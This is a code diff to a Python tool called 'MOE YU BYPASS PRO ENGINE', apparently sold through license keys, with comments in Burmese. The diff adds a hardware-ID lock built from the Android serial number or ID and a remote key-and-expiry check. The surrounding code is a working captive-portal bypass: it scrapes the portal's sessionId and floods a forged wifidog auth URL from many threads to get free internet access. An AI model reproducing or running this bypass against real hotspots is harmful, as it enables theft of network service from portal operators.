@@ -7,6 +7,7 @@ import logging
 import random
 import sys
 import datetime
+import subprocess
 from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.panel import Panel
@@ -24,7 +25,7 @@ MIN_INTERVAL = 0.05
 MAX_INTERVAL = 0.2
 DEBUG = False
 
-# COLOR SYSTEM (Hacker UI)
+# COLOR SYSTEM
 RED = "\033[91m"
 GREEN = "\033[92m"
 CYAN = "\033[96m"
@@ -32,13 +33,7 @@ YELLOW = "\033[93m"
 MAGENTA = "\033[95m"
 RESET = "\033[0m"
 
-# LOGGING
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s | %(message)s",
-    datefmt="%H:%M:%S"
-)
-
+logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
 stop_event = threading.Event()
 
 # ===============================
@@ -56,6 +51,33 @@ BANNER = """
 """
 
 # ===============================
+# HWID & SECURITY FUNCTIONS
+# ===============================
+def get_hwid():
+    """ဖုန်းရဲ့ Unique ID ကို ထုတ်ယူခြင်း"""
+    try:
+        # Serial Number သို့မဟုတ် Android ID ကို ယူမည်
+        id_cmd = subprocess.check_output(['getprop', 'ro.serialno']).decode().strip()
+        if not id_cmd or id_cmd == "unknown":
+            id_cmd = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode().strip()
+        # ဖတ်ရလွယ်အောင် ရှေ့က MOE- ခံပြီး ၈ လုံးပဲ ယူမည်
+        return f"MOE-{id_cmd[:8].upper()}"
+    except:
+        return "MOE-UNKNOWN-ID"
+
+def check_expiry(expiry_str):
+    if expiry_str.upper() == "NONE" or expiry_str.upper() == "LIFETIME":
+        return True, "Lifetime"
+    try:
+        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
+        current_date = datetime.datetime.now()
+        if current_date > expiry_date:
+            return False, expiry_date.strftime('%d-%b-%Y')
+        return True, expiry_date.strftime('%d-%b-%Y')
+    except:
+        return True, "Lifetime"
+
+# ===============================
 # UI FUNCTIONS
 # ===============================
 def display_hacker_flag():
@@ -63,8 +85,7 @@ def display_hacker_flag():
     yellow = f"[bold on yellow]{' ' * w}[/bold on yellow]"
     green  = f"[bold on green]{' ' * 19}★{' ' * 20}[/bold on green]"
     red    = f"[bold on red]{' ' * w}[/bold on red]"
-    flag_map = f"{yellow}\n{green}\n{red}"
-    console.print(Align.center(Panel(flag_map, border_style="bold white", padding=(0, 0), expand=False)))
+    console.print(Align.center(Panel(f"{yellow}\n{green}\n{red}", border_style="bold white", padding=(0, 0), expand=False)))
     console.print(Align.center(BANNER))
     console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]"))
     console.print(Align.center("[bold #333333]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold #333333]\n"))
@@ -84,60 +105,62 @@ def hacking_status(message, duration=0.8):
 
 def success_fireworks():
     colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
-    for _ in range(3):
-        for _ in range(12):
-            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"]) + " " * random.randint(1, 10)
+    for _ in range(2):
+        for _ in range(8):
+            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"])
             console.print(Text(fire, style=random.choice(colors)))
-            time.sleep(0.03)
-        console.print(Align.center("[bold gold1]🎆 SYSTEM UNLOCKED 🎆[/bold gold1]"))
-        time.sleep(0.2)
+            time.sleep(0.02)
 
 # ===============================
-# EXPIRY & LICENSE CHECK
+# LICENSE CHECK WITH HWID LOCK
 # ===============================
-def check_expiry(expiry_str):
-    try:
-        # Expected format: YYYY-MM-DD (e.g., 2026-05-13)
-        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
-        current_date = datetime.datetime.now()
-        
-        if current_date > expiry_date:
-            return False, expiry_date.strftime('%d-%b-%Y')
-        return True, expiry_date.strftime('%d-%b-%Y')
-    except:
-        return True, "Lifetime" # ရက်စွဲမှားနေလျှင် သို့မဟုတ် မပါလျှင် Lifetime ဟုသတ်မှတ်မည်
-
 def check_license_hacker_style():
+    my_hwid = get_hwid()
     console.clear()
     display_hacker_flag()
+    
+    # HWID ကို အပေါ်မှာ အမြဲပြထားမယ်
+    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", 
+                                     title="[bold red]DEVICE INFO[/bold red]", 
+                                     border_style="bold cyan", expand=False)))
+    
     console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))
+
     try:
         user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
-    except EOFError:
-        user_key = ""
+    except EOFError: user_key = ""
+    
     if not user_key:
-        console.print("\n[bold red][!] ERROR: NULL_KEY[/bold red]")
         sys.exit()
 
-    hacking_status("Connecting to GitHub Database...")
+    hacking_status("Connecting to Secure Server...")
     try:
         response = requests.get(URL, timeout=10)
-        # GitHub key.txt ထဲမှာ Key|YYYY-MM-DD ပုံစံဖြင့် သိမ်းဆည်းထားရပါမည်
         lines = [line.strip() for line in response.text.splitlines() if line.strip()]
         
         found = False
-        hacking_status("Decrypting Database...")
+        hacking_status("Verifying HWID & Expiry...")
         
         for entry in lines:
-            if "|" in entry:
-                db_key, exp_date = entry.split("|")
-            else:
-                db_key, exp_date = entry, "None"
+            # Format: Key|Expiry|HWID
+            parts = entry.split("|")
+            db_key = parts[0].strip()
+            exp_date = parts[1].strip() if len(parts) > 1 else "None"
+            db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
 
             if user_key == db_key:
-                # Key မှန်လျှင် သက်တမ်းစစ်မည်
-                is_active, date_label = check_expiry(exp_date)
+                found = True
                 
+                # 1. HWID Lock စစ်ဆေးခြင်း
+                # db_hwid က "FREE" ဖြစ်နေရင် ဘယ်ဖုန်းမဆိုရမယ်၊ HWID ပါနေရင်တော့ တိုက်စစ်မယ်
+                if db_hwid != "FREE" and db_hwid != my_hwid:
+                    simpler_hacker_typing("ACCESS_DENIED: HWID_MISMATCH", style="bold red")
+                    console.print(f"\n[bold red]❌ ဒီ Key က တခြားဖုန်းမှာ သုံးထားပြီးသား ဖြစ်နေပါတယ်![/bold red]")
+                    console.print(f"[bold yellow]⚠️ သင့် HWID ({my_hwid}) ကို Admin ဆီ ပို့ပြီး အတည်ပြုခိုင်းပါ။[/bold yellow]")
+                    sys.exit()
+                
+                # 2. Expiry စစ်ဆေးခြင်း
+                is_active, date_label = check_expiry(exp_date)
                 if is_active:
                     success_fireworks()
                     simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
@@ -146,17 +169,14 @@ def check_license_hacker_style():
                 else:
                     simpler_hacker_typing("ACCESS_DENIED: KEY_EXPIRED", style="bold red")
                     console.print(f"\n[bold red]❌ သင့် Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ ({date_label})[/bold red]")
-                    console.print("[bold yellow]⚠️ ကျေးဇူးပြု၍ Admin ထံတွင် သက်တမ်းတိုးပါ။[/bold yellow]")
                     sys.exit()
 
-        # Key မတွေ့ရှိပါက
         simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
         console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
         sys.exit()
 
     except Exception as e:
         console.print(f"\n[bold red]📡 DATABASE ERROR: Check internet connection.[/bold red]")
-        if DEBUG: print(e)
         sys.exit()
 
 # ===============================
@@ -190,7 +210,6 @@ def high_speed_ping(auth_link, sid):
 def start_bypass_process():
     bypass_banner()
     logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
-
     while not stop_event.is_set():
         session = requests.Session()
         test_url = "http://connectivitycheck.gstatic.com/generate_204"
@@ -201,50 +220,33 @@ def start_bypass_process():
                     print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                     time.sleep(5)
                     continue
-
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
             print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
-
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
             r2 = session.get(next_url, verify=False, timeout=10)
-
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             if not sid:
                 sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                 sid = sid_match.group(1) if sid_match else None
-
             if not sid:
                 logging.warning(f"{RED}Session ID Not Found{RESET}")
                 time.sleep(5)
                 continue
-
             print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
-            
-            # Voucher Endpoint check
-            voucher_api = f"{portal_host}/api/auth/voucher/"
-            try:
-                session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-            except:
-                pass
-
             params = parse_qs(parsed_portal.query)
             gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
             gw_port = params.get('gw_port', ['2060'])[0]
             auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-
             print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
             for _ in range(PING_THREADS):
                 threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
-
             while check_real_internet():
                 time.sleep(5)
         except Exception as e:
-            if DEBUG:
-                logging.error(f"{RED}Error: {e}{RESET}")
             time.sleep(5)
 
 # ===============================
@@ -253,14 +255,8 @@ def start_bypass_process():
 if __name__ == "__main__":
     if check_license_hacker_style():
         with console.status("[bold green]Injecting Packets...", spinner="shark"):
-            time.sleep(2)
-        
-        console.print(Panel(
-            Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"),
-            border_style="bold red",
-            expand=False
-        ))
-        
+            time.sleep(1.5)
+        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
         try:
             start_bypass_process()
         except KeyboardInterrupt:
